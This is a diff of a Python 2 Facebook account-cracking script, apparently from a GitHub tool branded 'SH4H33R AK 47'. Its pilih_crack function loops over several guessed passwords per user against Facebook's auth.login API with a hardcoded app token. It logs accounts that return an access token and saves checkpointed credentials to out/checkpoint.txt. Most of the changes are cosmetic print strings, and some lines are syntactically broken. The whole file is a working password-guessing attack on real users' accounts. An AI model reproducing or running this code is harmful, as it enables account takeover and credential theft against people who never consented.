@@ -56,7 +56,7 @@ B='\033[1;93m'
 logo = """
 \033[1;93m   S H 4 H 3 3 R  A K  4 7
 
-\033[1;91m--> GITHUB :- https://github.com/shaheerAk47/S1
+\033[1;91m--> GITHUB :- https://github.com/shaheerAk47/1txSH4H33R
 
 \033[1;93m--> N O T E  :- I AM NOT RESPONSIBLE FOR ANY MISSUSE :) 
 
@@ -64,7 +64,7 @@ logo = """
 logo2 = """
 \033[1;93m   S H 4 H 3 3 R  A K  4 7
 
-\033[1;91m--> GITHUB :- https://github.com/shaheerAk47/S1
+\033[1;91m--> GITHUB :- https://github.com/shaheerAk47/1txSH4H33R
 
 \033[1;92m--> N O T E :- I AM NOT RESPONSIBLE FOR ANY MISSUSE :) 
 
@@ -361,13 +361,12 @@ def pilih_crack():
 			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 			s = json.load(data)
 			if 'access_token' in s:
-				print '\x1b[1;93m[ ✯\x1b[1;93m'\x1b[1;93m\x1b[1;93m  + user + ' \x1b[1;93m\x1b[1;93m ' + pass1
+				print '\x1b[1;93m[ ✯ ]\x1b[1;93m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass1
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in s["error_msg"]:
-					print '\x1b[1;93m[ ✯ ] \x1b[1;93m' 
-					print'\x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass1
-					cek = open("out/CP.txt", "k")
+					print '\x1b[1;93m[ ✯ ]\x1b[1;93m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass1
+					cek = open("out/checkpoint.txt", "k")
 					cek.write(user+"|"+pass1+"\n")
 					cek.close()
 					cekpoint.append(user+pass1)
@@ -376,11 +375,11 @@ def pilih_crack():
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					s = json.load(data)
 					if 'access_token' in s:
-						print '\x1b[1;93m[ ✯ ] \x1b[1;93m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass2
+						print '\x1b[1;93m[ ✯ ]\x1b[1;93m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass2
 						oks.append(user+pass2)
 					else:
 						if 'www.facebook.com' in s["error_msg"]:
-							print '\x1b[1;93m[ ✯ ] \x1b[1;93m' \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass2
+							print '\x1b[1;93m[ ✯ ]\x1b[1;93m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass2
 							cek = open("out/checkpoint.txt", "k")
 							cek.write(user+"|"+pass2+"\n")
 							cek.close()
@@ -390,11 +389,11 @@ def pilih_crack():
 							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 							s = json.load(data)
 							if 'access_token' in s:
-								print '\x1b[1;93mLive\x1b[1;97m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93 ' + pass3
+								print '\x1b[1;93m[ ✯ ]\x1b[1;97m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93 ' + pass3
 								oks.append(user+pass3)
 							else:
 								if 'www.facebook.com' in s["error_msg"]:
-									print '\x1b[1;93m[✺]\x1b[1;93m \x1b[1;93\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass3
+									print '\x1b[1;93m[ ✯ ]\x1b[1;93m \x1b[1;93\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass3
 									cek = open("out/checkpoint.txt", "k")
 									cek.write(user+"|"+pass3+"\n")
 									cek.close()
@@ -404,11 +403,11 @@ def pilih_crack():
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									s = json.load(data)
 									if 'access_token' in s:
-										print '\x1b[1;93mLive\x1b[1;93m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m' + pass4
+										print '\x1b[1;93m[ ✯ ]\x1b[1;93m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m' + pass4
 										oks.append(user+pass4)
 									else:
 										if 'www.facebook.com' in s["error_msg"]:
-											print '\x1b[1;93m[✺]\x1b[1;93 \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass4
+											print '\x1b[1;93m[✯]\x1b[1;93 \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass4
 											cek = open("out/checkpoint.txt", "k")
 											cek.write(user+"|"+pass4+"\n")
 											cek.close()
@@ -418,11 +417,11 @@ def pilih_crack():
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											s = json.load(data)
 											if 'access_token' in s:
-												print '\x1b[1;93mLive\x1b[1;93m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass5
+												print '\x1b[1;93m[ ✯ ]\x1b[1;93m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass5
 												oks.append(user+pass5)
 											else:
 												if 'www.facebook.com' in s["error_msg"]:
-													print '\x1b[1;93m[✺]\x1b[1;93m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass5
+													print '\x1b[1;93m[ ✯ ]\x1b[1;93m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass5
 													cek = open("out/checkpoint.txt", "k")
 													cek.write(user+"|"+pass5+"\n")
 													cek.close()
@@ -432,11 +431,11 @@ def pilih_crack():
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													s = json.load(data)
 													if 'access_token' in s:
-														print '\x1b[1;93mLive\x1b[1;93m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass6
+														print '\x1b[1;93m[ ✯ ]\x1b[1;93m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass6
 														oks.append(user+pass6)
 													else:
 														if 'www.facebook.com' in s["error_msg"]:
-															print '\x1b[1;93m[✺]\x1b[1;93m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass6
+															print '\x1b[1;93m[ ✯ ]\x1b[1;93m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass6
 															cek = open("out/checkpoint.txt", "k")
 															cek.write(user+"|"+pass6+"\n")
 															cek.close()
@@ -450,7 +449,7 @@ def pilih_crack():
 																oks.append(user+pass8)
 															else:
 																if 'www.facebook.com' in s["error_msg"]:
-																	print '\x1b[1;93m\x1b[1;93m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass8
+																	print '\x1b[1;93m[ ✯ ]\x1b[1;93m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass8
 																	cek = open("out/checkpoint.txt", "k")
 																	cek.write(user+"|"+pass8+"\n")
 																	cek.close()
@@ -461,7 +460,7 @@ def pilih_crack():
 														oks.append(user+pass7)
 													else:
 														if 'www.facebook.com' in s["error_msg"]:
-															print '\x1b[1;93m[✺]\x1b[1;93m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass7
+															print '\x1b[1;93m[ ✯ ]\x1b[1;93m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass7
 															cek = open("out/checkpoint.txt", "k")
 															cek.write(user+"|"+pass7+"\n")
 															cek.close()
@@ -475,11 +474,11 @@ def pilih_crack():
 																oks.append(user+pass8)
 															else:
 																if 'www.facebook.com' in s["error_msg"]:
-																	print '\x1b[1;93m[✺]\x1b[1;93m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass8
+																	print '\x1b[1;93m[ ✯ ]\x1b[1;93m \x1b[1;93m\x1b[1;93m ' + user + ' \x1b[1;93m\x1b[1;93m ' + pass8
 																	cek = open("out/checkpoint.txt", "k")
-																	cek.write(user+"|"+pass7+"\n")
+																	cek.write(user+"|"+pass8+"\n")
 																	cek.close()
-																	cekpoint.append(user+pass7)
+																	cekpoint.append(user+pass8)
 																	
 															
 		except:
